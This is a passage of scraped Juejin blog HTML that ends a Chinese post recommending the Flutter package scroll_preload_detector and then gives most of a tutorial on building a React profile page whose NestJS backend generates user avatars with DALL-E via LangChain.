<p>我最近使用了一个库 <strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fpub.dev%2Fpackages%2Fscroll_preload_detector" target="_blank" title="https://pub.dev/packages/scroll_preload_detector" ref="nofollow noopener noreferrer">scroll_preload_detector</a></strong>，之所以用它，是因为一个关键特性：<strong>低侵入</strong> 。</p>
<h3 data-id="heading-7">什么是“低侵入”？</h3>
<p>这意味着你现有的代码可以保持原样：</p>
<ul>
<li>不需要把 <code>StatelessWidget</code> 改为 <code>StatefulWidget</code>。</li>
<li>不需要注入 <code>ScrollController</code>。</li>
<li>不需要修改你的 <code>ListView</code> 或 <code>itemBuilder</code>。</li>
</ul>
<h3 data-id="heading-8">3.1 清爽的实现</h3>
<p>这个库将计算、防抖处理和状态防卫封装成了一个声明式的 API。</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> <span class="hljs-string">'package:scroll_preload_detector/scroll_preload_detector.dart'</span>;

ScrollPreloadDetector(
  <span class="hljs-comment">// 当剩余内容不足 600px 时开始加载</span>
  preloadDistance: <span class="hljs-number">600.0</span>,
  
  <span class="hljs-comment">// 如果数据已耗尽，不要触发</span>
  <span class="hljs-comment">// 这自动防止了不必要的 API 调用</span>
  hasMore: () =&gt; _viewModel.hasMoreData,
  
  <span class="hljs-comment">// 自动处理异步逻辑</span>
  preload: () <span class="hljs-keyword">async</span> {
    <span class="hljs-keyword">await</span> _viewModel.fetchMoreData();
  },
  
  child: ListView.builder(
    itemCount: items.length,
    itemBuilder: (context, index) =&gt; MyCard(items[index]),
  ),
)
</code></pre>
<h3 data-id="heading-9">为什么这是“更合理”的方案：</h3>
<ol>
<li><strong>安全性：</strong> 它强制你定义 <code>hasMore</code>，解决了 App 在列表底部不断尝试请求无效数据的常见 Bug。</li>
<li><strong>整洁性：</strong> 它分离了<strong>布局的职责</strong>（你的 List）和<strong>分页的职责</strong>（Detector）。</li>
<li><strong>通用性：</strong> 因为它是包裹在 Widget 外层的，所以它适用于 <code>GridView</code>、<code>SliverList</code>、<code>CustomScrollView</code> 或任何可滚动的组件。</li>
</ol>
<h2 data-id="heading-10">🤝 让我们一起共建</h2>
<p>Flutter 生态系统的美妙之处在于，我们不必独自解决这些问题。<strong>scroll_preload_detector</strong> 是一个小而美的工具，它简化了我们的日常工作。</p>
<p>如果你厌倦了在每个项目里写重复的 <code>addListener</code> 样板代码：</p>
<ol>
<li>在你的下一个 App 中<strong>试用它</strong>。</li>
<li>在 <a href="https://link.juejin.cn?target=https%3A%2F%2Fpub.dev%2Fpackages%2Fscroll_preload_detector" target="_blank" title="https://pub.dev/packages/scroll_preload_detector" ref="nofollow noopener noreferrer">Pub.dev</a> 上<strong>给它点个 Star</strong>。</li>
<li>如果你发现了边缘情况，提交一个 PR！</li>
</ol>
<p>让我们彻底告别 Loading 转圈。</p>
<h3 data-id="heading-11">感谢阅读！</h3>
<p>如果你觉得这篇技术指南对你有帮助，请点赞鼓励。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[🚀 AI全栈项目第十五天：Mine界面打造与AI头像生成的奇妙之旅 ✨]]></title>    <link>https://juejin.cn/post/7603221478473891882</link>    <guid>https://juejin.cn/post/7603221478473891882</guid>    <pubDate>2026-02-05T15:43:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7603221478473891882" data-draft-id="7603221478473875498" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="🚀 AI全栈项目第十五天：Mine界面打造与AI头像生成的奇妙之旅 ✨"/> <meta itemprop="keywords" content="React.js,NestJS"/> <meta itemprop="datePublished" content="2026-02-05T15:43:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="神秘的猪头"/> <meta itemprop="url" content="https://juejin.cn/user/793223472877051"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            🚀 AI全栈项目第十五天：Mine界面打造与AI头像生成的奇妙之旅 ✨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/793223472877051/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    神秘的猪头
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T15:43:09.000Z" title="Thu Feb 05 2026 15:43:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>👋 <strong>Hello 掘金的同学们！</strong> 欢迎回到我们的 <strong>AI全栈开发</strong> 系列教程！</p>
<p>不知不觉我们已经一起走到了第 15 天。半个月的坚持，我们从零开始搭建项目，现在的你是不是感觉前后端的交互越来越顺手了？这种打通任督二脉的感觉简直太棒了！😎</p>
<p>今天我们要搞点好玩的——给我们的用户增加一点“个性”。没错，我们要完成 <strong>Mine（个人中心）</strong> 页面，并且加入一个超级酷炫的功能：<strong>AI 自动生成头像</strong>！🤖🎨</p>
<p>想象一下，用户不需要自己在相册里翻找半天，只需要点一下“AI 生成”，一个专属的、独一无二的头像就诞生了。是不是很有极客范儿？</p>
<p>话不多说，系好安全带，我们发车啦！🚗💨</p>
<hr/>
<h2 data-id="heading-0">🎨 第一站：Mine 页面与 Drawer 组件的“积木艺术”</h2>
<p>首先，我们需要一个入口。在移动端应用中，个人中心（Mine）通常是用户管理自己资料的地方。为了让体验更加丝滑，我们不想用生硬的弹窗，而是选择了 <strong>Shadcn UI</strong> 提供的 <code>Drawer</code>（抽屉）组件。</p>
<h3 data-id="heading-1">1.1 深度拆解：Drawer 组件家族 🧩</h3>
<p>在看业务代码之前，我们需要先认识一下构建这个抽屉的“积木”。Shadcn 的 Drawer 组件采用的是<strong>组合式 API (Compound Components)</strong> 的设计模式，这非常灵活。</p>
<p>看看我们在 <code>src/pages/Mine.tsx</code> 引入的这组“全家桶”：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> {
  <span class="hljs-title class_">Drawer</span>,            <span class="hljs-comment">// 📦 根容器：管理抽屉的开关状态</span>
  <span class="hljs-title class_">DrawerTrigger</span>,     <span class="hljs-comment">// 👆 触发器：点击它，抽屉就会滑出来</span>
  <span class="hljs-title class_">DrawerContent</span>,     <span class="hljs-comment">// 📄 内容层：抽屉里真正装的东西（白色面板）</span>
  <span class="hljs-title class_">DrawerHeader</span>,      <span class="hljs-comment">// 🏷️ 头部区域：通常放标题</span>
  <span class="hljs-title class_">DrawerTitle</span>,       <span class="hljs-comment">// 📌 标题：对屏幕阅读器友好的标题组件</span>
  <span class="hljs-title class_">DrawerDescription</span>, <span class="hljs-comment">// 📝 描述：副标题或说明文字</span>
  <span class="hljs-title class_">DrawerFooter</span>,      <span class="hljs-comment">// 🦶 底部区域：通常放取消按钮</span>
  <span class="hljs-title class_">DrawerClose</span>        <span class="hljs-comment">// ❌ 关闭动作：点击包裹在里面的元素会关闭抽屉</span>
} <span class="hljs-keyword">from</span> <span class="hljs-string">'@/components/ui/drawer'</span>;
</code></pre>
<p><strong>它们是如何配合打造一个完美抽屉的？</strong></p>
<ol>
<li><strong>最外层</strong>由 <code>&lt;Drawer&gt;</code> 包裹，它是一个上下文（Context）提供者，负责告诉里面的子组件“现在是开着还是关着”。</li>
<li><strong>触发开关</strong> <code>&lt;DrawerTrigger&gt;</code> 放在页面上可见的地方（比如头像），用户一点，信号传给 <code>&lt;Drawer&gt;</code>，状态变为 <code>open: true</code>。</li>
<li><strong>弹出层</strong> <code>&lt;DrawerContent&gt;</code> 监听到状态变化，从屏幕底部优雅地滑出。</li>
<li><strong>内容结构</strong> 遵循 Header (Title + Description) -&gt; Body (自定义内容) -&gt; Footer (Close) 的标准布局，既美观又符合无障碍访问（Accessibility）标准。</li>
</ol>
<h3 data-id="heading-2">1.2 代码实战：构建 UI</h3>
<p>理解了组件原理，我们来看代码就一目了然了。</p>
<p>📍 <strong>坐标</strong>：<code>frontend/notes/src/pages/Mine.tsx</code></p>
<pre><code class="hljs language-tsx" lang="tsx"><span class="hljs-comment">// ...</span>

<span class="hljs-comment">// 👇 open 和 setOpen 用于手动控制抽屉状态（除了点击触发，我们还需要代码控制关闭）</span>
&lt;<span class="hljs-title class_">Drawer</span> open={open} onOpenChange={setOpen}&gt;
  
  {<span class="hljs-comment">/* 👆 1. 触发器区域 */</span>}
  &lt;<span class="hljs-title class_">DrawerTrigger</span> asChild&gt;
    {<span class="hljs-comment">/* asChild 表示 Trigger 不会多渲染一个 button，而是直接把点击事件绑定到下面的 div 上 */</span>}
    &lt;div className=<span class="hljs-string">"h-16 w-16 rounded-full bg-primary/10 flex 
    items-center justify-center text-primary text-xl font-bold"</span>&gt;
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">Avatar</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"h-16 w-16"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">AvatarImage</span> <span class="hljs-attr">src</span>=<span class="hljs-string">{user?.avatar}</span> /&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">AvatarFallback</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"bg-primary/10 text-primary text-xl font-bold"</span>&gt;</span>
        {user?.name?.[0].toUpperCase()}
        <span class="hljs-tag">&lt;/<span class="hljs-name">AvatarFallback</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">Avatar</span>&gt;</span></span>
    &lt;/div&gt;
  &lt;/<span class="hljs-title class_">DrawerTrigger</span>&gt;
  
  {<span class="hljs-comment">/* 📄 2. 抽屉内容区域 */</span>}
  &lt;<span class="hljs-title class_">DrawerContent</span>&gt;
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"mx-auto w-full max-w-sm"</span>&gt;</span>
      
      {/* 🏷️ 头部：告知用户这是干嘛的 */}
      <span class="hljs-tag">&lt;<span class="hljs-name">DrawerHeader</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"text-left"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">DrawerTitle</span>&gt;</span>修改头像<span class="hljs-tag">&lt;/<span class="hljs-name">DrawerTitle</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">DrawerDescription</span>&gt;</span>
          请选择一种方式更新您的个人头像
        <span class="hljs-tag">&lt;/<span class="hljs-name">DrawerDescription</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">DrawerHeader</span>&gt;</span>
      
      {/* ✨ 核心操作区：三个按钮 */}
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"p-4 space-y-3"</span>&gt;</span>
        {/* 📸 选项一：拍照 */}
        <span class="hljs-tag">&lt;<span class="hljs-name">Button</span>
          <span class="hljs-attr">variant</span>=<span class="hljs-string">"outline"</span>
          <span class="hljs-attr">className</span>=<span class="hljs-string">"w-full justify-start h-14 text-base"</span>
          <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> handleAction('camera')}
        &gt;
          <span class="hljs-tag">&lt;<span class="hljs-name">Camera</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"mr-3 h-5 w-5 text-blue-500"</span>/&gt;</span>
          拍照
        <span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>

        {/* 🖼️ 选项二：从相册上传 */}
        <span class="hljs-tag">&lt;<span class="hljs-name">Button</span>
          <span class="hljs-attr">variant</span>=<span class="hljs-string">"outline"</span>
          <span class="hljs-attr">className</span>=<span class="hljs-string">"w-full justify-start h-14 text-base"</span>
          <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> handleAction('upload')}
        &gt;
          <span class="hljs-tag">&lt;<span class="hljs-name">Upload</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"mr-3 h-5 w-5 text-blue-500"</span>/&gt;</span>
          从相册上传
        <span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>

        {/* 🤖 选项三：AI 生成头像 (今天的重头戏！) */}
        <span class="hljs-tag">&lt;<span class="hljs-name">Button</span>
          <span class="hljs-attr">variant</span>=<span class="hljs-string">"outline"</span>
          <span class="hljs-attr">className</span>=<span class="hljs-string">"w-full justify-start h-14 text-base
          bg-gradient-to-r from-purple-600 to-indigo-600 border-none  
          "</span>
          <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> handleAction('ai')}
        &gt;
          {/* Sparkles 图标非常适合 AI 这种神奇的功能 */}
          <span class="hljs-tag">&lt;<span class="hljs-name">Sparkles</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"mr-3 h-5 w-5 text-yellow-300"</span>/&gt;</span>
          AI 生成头像
        <span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      
      {/* 🦶 底部：取消按钮 */}
      <span class="hljs-tag">&lt;<span class="hljs-name">DrawerFooter</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"pt-2"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">DrawerClose</span> <span class="hljs-attr">asChild</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">Button</span> <span class="hljs-attr">variant</span>=<span class="hljs-string">"ghost"</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"w-full h-12"</span>&gt;</span>取消<span class="hljs-tag">&lt;/<span class="hljs-name">Button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">DrawerClose</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">DrawerFooter</span>&gt;</span>

    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  &lt;/<span class="hljs-title class_">DrawerContent</span>&gt;
&lt;/<span class="hljs-title class_">Drawer</span>&gt;
</code></pre>
<p><strong>💡 设计亮点：</strong></p>
<ul>
<li><strong>交互逻辑</strong>：每个按钮都绑定了 <code>handleAction</code> 方法，并传入不同的参数（'camera', 'upload', 'ai'）。这是一种非常清晰的 <strong>事件委托</strong> 思想的简化版。</li>
<li><strong>视觉层级</strong>：给 AI 按钮加了一个 <code>bg-gradient-to-r from-purple-600 to-indigo-600</code> 紫色渐变背景，这是设计界的“AI 色”，暗示这个功能很高级、很智能！💜</li>
</ul>
<h2 data-id="heading-3"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4239a116de3b45bb9dc89df427b180c1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg56We56eY55qE54yq5aS0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770910989&amp;x-signature=uhBdTFdrD6nbKOH75PyrSV9R%2Fwk%3D" alt="image.png" loading="lazy"/></h2>
<h2 data-id="heading-4">🧠 第二站：前端大脑 —— 状态管理 (Zustand)</h2>
<p>当用户激动地点击了“AI 生成头像”按钮，发生了什么？</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// Mine.tsx 中的处理函数</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleAction</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"><span class="hljs-keyword">type</span>: <span class="hljs-built_in">string</span></span>) =&gt; {
   <span class="hljs-title function_">setOpen</span>(<span class="hljs-literal">false</span>); <span class="hljs-comment">// 先把抽屉关上，提升体验</span>
   <span class="hljs-keyword">if</span>(<span class="hljs-keyword">type</span> == <span class="hljs-string">'ai'</span>){
     <span class="hljs-title function_">setLoading</span>(<span class="hljs-literal">true</span>); <span class="hljs-comment">// 开启 loading 状态，因为 AI 生成需要时间</span>
     <span class="hljs-keyword">await</span> <span class="hljs-title function_">aiAvatar</span>(); <span class="hljs-comment">// 调用 store 中的 action</span>
     <span class="hljs-title function_">setLoading</span>(<span class="hljs-literal">false</span>); <span class="hljs-comment">// 结束 loading</span>
  }
}
</code></pre>
<p>这里调用了 <code>aiAvatar()</code>。这个方法在哪里？它存在于我们的状态管理库 <strong>Zustand</strong> 中。</p>
<p>📍 <strong>坐标</strong>：<code>frontend/notes/src/store/useUserStore.ts</code></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ... inside create store</span>
<span class="hljs-attr">aiAvatar</span>: <span class="hljs-keyword">async</span> () =&gt; {
    <span class="hljs-comment">// 1. 获取当前用户信息</span>
    <span class="hljs-comment">// get() 是 Zustand 提供的各种访问 store 内部状态的方法</span>
    <span class="hljs-keyword">const</span> name = <span class="hljs-title function_">get</span>().<span class="hljs-property">user</span>?.<span class="hljs-property">name</span>;
    
    <span class="hljs-comment">// 2. 核心调用：请求 AI 生成头像的接口</span>
    <span class="hljs-comment">// 我们把用户名传过去，让 AI 根据名字找灵感</span>
    <span class="hljs-keyword">const</span> avatar = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getAiAvatar</span>(name);
    
    <span class="hljs-comment">// 3. 更新状态</span>
    <span class="hljs-comment">// set() 用于更新 store</span>
    <span class="hljs-title function_">set</span>({
        <span class="hljs-attr">user</span>: {
            ...<span class="hljs-title function_">get</span>().<span class="hljs-property">user</span>, <span class="hljs-comment">// 保留原有的 user 信息（如 id, email 等）</span>
            avatar <span class="hljs-comment">// 只更新 avatar 字段为新生成的 URL</span>
        }
    })
}
</code></pre>
<p><strong>🤔 为什么要这么写？</strong></p>
<p>我们将业务逻辑封装在 Store 中，而不是直接写在组件里。</p>
<ul>
<li><strong>解耦</strong>：组件只负责“显示”和“触发”，Store 负责“怎么做”。</li>
<li><strong>复用</strong>：如果在其他页面也需要生成头像，直接调用 <code>aiAvatar</code> 即可。</li>
</ul>
<hr/>
<h2 data-id="heading-5">🌉 第三站：通信桥梁 —— API 定义</h2>
<p>前端需要向后端喊话：“嘿，给我变个头像出来！”📣</p>
<p>📍 <strong>坐标</strong>：<code>frontend/notes/src/api/user.ts</code></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> instance <span class="hljs-keyword">from</span> <span class="hljs-string">'./axios-instance'</span>; 

<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">getAiAvatar</span> = (<span class="hljs-params">name:<span class="hljs-built_in">string</span></span>) =&gt; {
    <span class="hljs-comment">// 发送 HTTP GET 请求</span>
    <span class="hljs-comment">// 注意：这里我们使用 GET 请求，把 name 作为查询参数传递</span>
    <span class="hljs-keyword">return</span> instance.<span class="hljs-title function_">get</span>(<span class="hljs-string">`/ai/avatar?name=<span class="hljs-subst">${name}</span>`</span>);
}   
</code></pre>
<p><strong>📝 知识点卡片：</strong>
虽然创建资源常用 <code>POST</code>，但这里语义更偏向于“获取”（Get）一个基于名字计算出来的资源。所以使用 <code>GET</code> 请求配合 Query Parameters (<code>?name=xxx</code>) 是完全符合 RESTful 风格的。</p>
<hr/>
<h2 data-id="heading-6">⚙️ 第四站：后端引擎 —— NestJS 与 AI 服务</h2>
<p>请求飞到了我们的后端服务器（NestJS）。</p>
<h3 data-id="heading-7">4.1 Controller (控制层)</h3>
<p>Controller 是后端的大门，负责接收请求。</p>
<p>📍 <strong>坐标</strong>：<code>backend/posts/src/ai/ai.controller.ts</code></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Controller</span>(<span class="hljs-string">'ai'</span>)
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AiController</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> aiService: AiService</span>) {}

  <span class="hljs-comment">// 对应前端的 GET /ai/avatar 请求</span>
  <span class="hljs-meta">@Get</span>(<span class="hljs-string">'avatar'</span>)
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">avatar</span>(<span class="hljs-params"><span class="hljs-meta">@Query</span>(<span class="hljs-string">'name'</span>) name: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-comment">// 委托给 aiService 去处理</span>
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">aiService</span>.<span class="hljs-title function_">avatar</span>(name);
  }
}
</code></pre>
<p><code>@Query('name')</code> 自动帮我们解析了 URL 中的 <code>?name=...</code> 参数。</p>
<h3 data-id="heading-8">4.2 Service (服务层) —— AI 的栖息地 🤖</h3>
<p>这里是核心逻辑所在。我们要调用 <strong>OpenAI</strong> (或兼容接口) 的 DALL·E 模型。</p>
<p>📍 <strong>坐标</strong>：<code>backend/posts/src/ai/ai.service.ts</code></p>
<p>首先，我们需要一个能够与 AI 对话的对象。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 引入必要的库，这里使用的是 LangChain 的封装</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">DallEAPIWrapper</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@langchain/openai'</span>; 

<span class="hljs-meta">@Injectable</span>()
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AiService</span> {
  <span class="hljs-comment">// 定义私有属性，用于存放图像生成器的实例</span>
  <span class="hljs-keyword">private</span> <span class="hljs-attr">imageGenerator</span>: <span class="hljs-title class_">DallEAPIWrapper</span>;

  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// 💡 在构造函数中初始化模型</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">imageGenerator</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DallEAPIWrapper</span>({
      <span class="hljs-attr">openAIApiKey</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">OPENAI_API_KEY</span>, <span class="hljs-comment">// 记得在 .env 文件里配好 Key！</span>
      <span class="hljs-attr">n</span>: <span class="hljs-number">1</span>,               <span class="hljs-comment">// 一次生成一张图</span>
      <span class="hljs-attr">size</span>: <span class="hljs-string">'1024x1024'</span>,  <span class="hljs-comment">// 高清大图</span>
      <span class="hljs-attr">quality</span>: <span class="hljs-string">'standard'</span> <span class="hljs-comment">// 标准质量</span>
    })
  }
</code></pre>
<p>接下来是具体的 <code>avatar</code> 方法，这里包含了我们的 <strong>Prompt Engineering（提示词工程）</strong>。</p>
<pre><code class="hljs language-typescript" lang="typescript">  <span class="hljs-keyword">async</span> <span class="hljs-title function_">avatar</span>(<span class="hljs-params">name: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-comment">// invoke 方法调用 DALL-E</span>
    <span class="hljs-comment">// 这里的字符串就是我们发给 AI 的“咒语” (Prompt)</span>
    <span class="hljs-keyword">const</span> imageUrl = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">imageGenerator</span>.<span class="hljs-title function_">invoke</span>(<span class="hljs-string">`
      你是一位头像设计师
      请根据用户的姓名<span class="hljs-subst">${name}</span>
      生成一个专业头像
      风格卡通时尚好看
    `</span>);
    
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(imageUrl, <span class="hljs-string">'/////'</span>);
    <span class="hljs-keyword">return</span> imageUrl;
  }
}
</code></pre>
<p><strong>🎩 魔术揭秘：</strong></p>
<ol>
<li><strong>Prompt 的艺术</strong>：我们给 AI 设定了<strong>角色</strong>（"你是一位头像设计师"）和<strong>风格要求</strong>（"风格卡通时尚好看"）。</li>
<li><strong>异步流</strong>：从 <code>handleAction</code> 到 <code>OpenAI</code>，整个链路都是异步的（Async/Await）。这意味着在等待 AI 作画时，前端展示 Loading，后端也不会阻塞，用户体验依然流畅。</li>
</ol>
<hr/>
<h2 data-id="heading-9">🌈 总结：全栈的魅力</h2>
